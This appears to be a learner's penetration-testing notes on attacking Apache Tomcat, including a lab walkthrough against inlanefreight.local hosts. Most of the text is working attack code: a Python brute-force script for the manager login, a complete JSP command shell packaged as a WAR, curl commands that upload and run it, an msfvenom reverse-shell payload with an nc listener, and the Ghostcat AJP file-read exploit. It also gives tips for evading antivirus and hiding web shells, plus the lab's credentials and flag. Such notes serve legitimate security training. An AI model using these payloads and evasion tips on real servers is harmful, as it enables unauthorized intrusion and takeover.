# Section 10 — Attacking Tomcat

Two main attack paths:

```
1. Manager login brute force → WAR upload → JSP shell → RCE
2. CVE-2020-1938 (Ghostcat) → AJP LFI → read WEB-INF files (no auth required)
```

---

## 1 — Manager Login Brute Force

### Metasploit (quickest)
```bash
msfconsole -q
use auxiliary/scanner/http/tomcat_mgr_login
set VHOST web01.inlanefreight.local
set RPORT 8180
set RHOSTS 10.129.201.58
set STOP_ON_SUCCESS true
run
# [+] 10.129.201.58:8180 - Login Successful: tomcat:admin
```

Wordlists used by default:
- `USERPASS_FILE`: `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt`
- `USER_FILE`: `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`
- `PASS_FILE`: `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`

### curl-based brute force (no MSF)
Tomcat manager uses HTTP Basic Auth — base64(user:pass) in Authorization header:
```bash
# Cross-product of user/pass lists (more thorough than userpass pairs)
python3 - << 'EOF'
import requests
url = "http://target:8180/manager/html"
with open("/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt") as f:
    users = [l.strip() for l in f if l.strip()]
with open("/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt") as f:
    passwords = [l.strip() for l in f if l.strip()]
for u in users:
    for p in passwords:
        r = requests.get(url, auth=(u, p), timeout=8)
        if r.status_code == 200:
            print(f"[+] FOUND: {u}:{p}")
            raise SystemExit(0)
EOF
```

**Better wordlist** — SecLists has a more complete tomcat list (76 entries):
```
~/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```
Format is `user:pass` — split on `:` and test cross-product.

### Debugging with Burp
Route MSF through Burp to verify credentials being tested:
```
set PROXIES HTTP:127.0.0.1:8080
```
Tomcat Basic Auth header is `Authorization: Basic base64(user:pass)`.

---

## 2 — WAR File Upload → RCE

Once authenticated to `/manager/html`:

### Option A: JSP shell (manual, lightweight)
```bash
# Create minimal JSP shell
cat > cmd.jsp << 'JSP'
<%@ page import="java.util.*,java.io.*"%>
<% if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String s;
    while ((s = dis.readLine()) != null) { out.println(s); }
} %>
JSP
zip -r backup.war cmd.jsp

# Upload — method depends on the user's Tomcat role:
# manager-script role → text API (curl-friendly):
curl -s --user "tomcat:PASS" \
  "http://target:8180/manager/text/deploy?path=/backup&update=true" \
  --upload-file backup.war

# manager-gui role only → must use HTML form (requires CSRF token + session cookie):
NONCE=$(curl -s -c /tmp/tc.txt --user "tomcat:PASS" "http://target:8180/manager/html" \
  | grep -oP 'CSRF_NONCE=\K[A-F0-9]+' | head -1)
curl -s -b /tmp/tc.txt --user "tomcat:PASS" \
  -F "deployWar=@backup.war;type=application/octet-stream" \
  "http://target:8180/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=${NONCE}"

# Execute — URL-encode special chars with --data-urlencode, not +
curl -s --get "http://target:8180/backup/cmd.jsp" --data-urlencode "cmd=id"
# uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

# Shell doesn't support redirects (>/dev/null etc.) — just omit them
curl -s --get "http://target:8180/backup/cmd.jsp" \
  --data-urlencode "cmd=find /opt/tomcat -name tomcat_flag.txt"
```

**Note:** The GUI-based WAR upload: browse to `/manager/html` → "WAR file to deploy" section → Browse → Deploy.

**Webroot location:** `/opt/tomcat/apache-tomcat-X.X.X/webapps/`

### Option B: msfvenom reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4443 -f war > backup.war
# Upload via manager GUI
nc -lvnp 4443
# Click /backup in manager to trigger
```

### Option C: Metasploit module
```
use multi/http/tomcat_mgr_upload
```

### Cleanup
Manager GUI → **Undeploy** next to the app → removes WAR + extracted directory.  
Undeploy removes both the .war file and the extracted /backup/ dir from webapps/.

### Web shell OPSEC
- Use randomized filenames (MD5 hash) not `cmd.jsp`/`shell.jsp`
- Restrict access by source IP via `.htaccess` or firewall rule
- `cmd.jsp` = 2/58 AV detections; change string literals to reduce to 0/58
- Always clean up — Undeploy, then verify 404

---

## 3 — CVE-2020-1938 (Ghostcat) — Unauthenticated AJP LFI

**Affects:** Tomcat < 9.0.31, < 8.5.51, < 7.0.100  
**Port:** 8009 (AJP)  
**Impact:** Read files within the webapp directory (NOT arbitrary filesystem — no `/etc/passwd`)

### Confirm AJP is running
```bash
nmap -sV -p 8009,8080 target
# 8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
```

### Exploit
```bash
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
# Returns web.xml contents

python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
# Also try: WEB-INF/tomcat-users.xml for credentials
```

**Key limitation:** Read access scoped to webapps/ tree only. High value targets:
- `WEB-INF/web.xml` — routes, class names, servlet config
- `WEB-INF/tomcat-users.xml` — admin credentials (if in webapp path)
- `META-INF/context.xml` — DB connection strings

---

## Lab Walkthrough (`web01.inlanefreight.local:8180`)

### Q1 — Valid username / Q2 — Password

Brute force via Python script (cross-product of MSF default user/pass lists).  
The `tomcat_mgr_default_userpass.txt` pairs file doesn't include all combos — use the separate user + pass files.

**Q1:** `tomcat`  
**Q2:** `root`

### Q3 — Flag via WAR upload

```bash
# 1. Create JSP shell WAR
cat > cmd.jsp << 'JSP'
<%@ page import="java.util.*,java.io.*"%>
<% if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String s;
    while ((s = dis.readLine()) != null) { out.println(s); }
} %>
JSP
zip -r backup.war cmd.jsp

# 2. Upload (tomcat user has manager-gui only, so use HTML form with CSRF token)
NONCE=$(curl -s -c /tmp/tc.txt --user "tomcat:root" \
  "http://web01.inlanefreight.local:8180/manager/html" \
  | grep -oP 'CSRF_NONCE=\K[A-F0-9]+' | head -1)
curl -s -b /tmp/tc.txt --user "tomcat:root" \
  -F "deployWar=@backup.war;type=application/octet-stream" \
  "http://web01.inlanefreight.local:8180/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=${NONCE}"

# 3. Find flag (use --data-urlencode, NOT + encoding)
curl -s --get "http://web01.inlanefreight.local:8180/backup/cmd.jsp" \
  --data-urlencode "cmd=find /opt/tomcat -name tomcat_flag.txt"
# /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt

# 4. Read flag
curl -s --get "http://web01.inlanefreight.local:8180/backup/cmd.jsp" \
  --data-urlencode "cmd=cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt"

# 5. Cleanup
curl -s -b /tmp/tc.txt --user "tomcat:root" \
  "http://web01.inlanefreight.local:8180/manager/html/undeploy?path=/backup&org.apache.catalina.filters.CSRF_NONCE=${NONCE}"
```

**Flag:** `t0mcat_rc3_ftw!`

---

## Exam Notes

- Tomcat manager path: `/manager/html` (GUI), `/manager/text/` (API)
- Default wordlists: `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_*`
- Basic Auth = base64(user:pass) — easy to script with `curl --user`
- WAR = zip of web app files; `zip -r app.war *.jsp` creates a deployable archive
- WAR undeploy removes both .war and extracted directory from webapps/
- Ghostcat (CVE-2020-1938): AJP port 8009, LFI scoped to webapps/ — targets WEB-INF files
- Tomcat often runs as SYSTEM/root → no privesc needed on some targets
- Webroot: `/opt/tomcat/apache-tomcat-X.X.X/webapps/` (common location)
- Use `/manager/text/deploy` API for programmatic WAR upload **only if user has manager-script role**
- If user has manager-gui only → must use HTML form upload with CSRF token + session cookie
- `--data-urlencode` is required for shell commands in curl (not `+` encoding — Tomcat rejects it)
- `root` is NOT in MSF default wordlists — use SecLists `tomcat-betterdefaultpasslist.txt`
